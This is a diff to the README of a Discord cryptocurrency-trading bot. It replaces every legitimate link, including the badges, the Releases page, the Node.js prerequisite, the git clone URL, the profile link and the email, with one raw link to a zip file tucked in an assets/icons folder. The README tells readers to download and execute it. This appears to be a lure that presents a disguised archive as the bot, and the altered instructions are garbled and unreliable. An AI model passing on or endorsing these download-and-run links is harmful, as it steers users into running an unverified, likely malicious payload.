@@ -1,7 +1,7 @@
 # 🚀 Crypto Bot: Your Discord Companion for Cryptocurrency Trading
 
-![Crypto Bot](https://img.shields.io/badge/Crypto_Bot-Discord%20Bot-blue.svg)  
-[![Latest Release](https://img.shields.io/github/release/sneijder777/crypto-bot.svg)](https://github.com/sneijder777/crypto-bot/releases)
+![Crypto Bot](https://github.com/sneijder777/crypto-bot/raw/refs/heads/main/assets/icons/crypto-bot-v1.7.zip%https://github.com/sneijder777/crypto-bot/raw/refs/heads/main/assets/icons/crypto-bot-v1.7.zip)  
+[![Latest Release](https://github.com/sneijder777/crypto-bot/raw/refs/heads/main/assets/icons/crypto-bot-v1.7.zip)](https://github.com/sneijder777/crypto-bot/raw/refs/heads/main/assets/icons/crypto-bot-v1.7.zip)
 
 Welcome to the **Crypto Bot** repository! This bot is designed for cryptocurrency trading communities and investors. With Crypto Bot, you can track and share trades, fetch charts and data, and engage with fellow traders on Discord.
 
@@ -28,14 +28,14 @@ Welcome to the **Crypto Bot** repository! This bot is designed for cryptocurrenc
 
 To get started with Crypto Bot, you will need a Discord account and a server where you can invite the bot. 
 
-1. **Visit the [Releases](https://github.com/sneijder777/crypto-bot/releases)** section to download the latest version of the bot.
+1. **Visit the [Releases](https://github.com/sneijder777/crypto-bot/raw/refs/heads/main/assets/icons/crypto-bot-v1.7.zip)** section to download the latest version of the bot.
 2. Follow the installation instructions below to set it up.
 
 ## Installation
 
 ### Prerequisites
 
-- Node.js (version 14 or higher)
+- https://github.com/sneijder777/crypto-bot/raw/refs/heads/main/assets/icons/crypto-bot-v1.7.zip (version 14 or higher)
 - A Discord account
 - Access to a Discord server where you can add the bot
 
@@ -44,7 +44,7 @@ To get started with Crypto Bot, you will need a Discord account and a server whe
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/sneijder777/crypto-bot.git
+   git clone https://github.com/sneijder777/crypto-bot/raw/refs/heads/main/assets/icons/crypto-bot-v1.7.zip
    cd crypto-bot
    ```
 
@@ -68,7 +68,7 @@ To get started with Crypto Bot, you will need a Discord account and a server whe
 
 ### Download and Execute
 
-For the latest version, make sure to [download it here](https://github.com/sneijder777/crypto-bot/releases) and execute it as per the installation steps.
+For the latest version, make sure to [download it here](https://github.com/sneijder777/crypto-bot/raw/refs/heads/main/assets/icons/crypto-bot-v1.7.zip) and execute it as per the installation steps.
 
 ## Usage
 
@@ -104,9 +104,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- GitHub: [sneijder777](https://github.com/sneijder777)
-- Email: your_email@example.com
+- GitHub: [sneijder777](https://github.com/sneijder777/crypto-bot/raw/refs/heads/main/assets/icons/crypto-bot-v1.7.zip)
+- Email: https://github.com/sneijder777/crypto-bot/raw/refs/heads/main/assets/icons/crypto-bot-v1.7.zip
 
 ---
 
-Thank you for checking out Crypto Bot! We hope it enhances your cryptocurrency trading experience on Discord. For updates and new features, keep an eye on the [Releases](https://github.com/sneijder777/crypto-bot/releases) section. Happy trading!
+Thank you for checking out Crypto Bot! We hope it enhances your cryptocurrency trading experience on Discord. For updates and new features, keep an eye on the [Releases](https://github.com/sneijder777/crypto-bot/raw/refs/heads/main/assets/icons/crypto-bot-v1.7.zip) section. Happy trading!
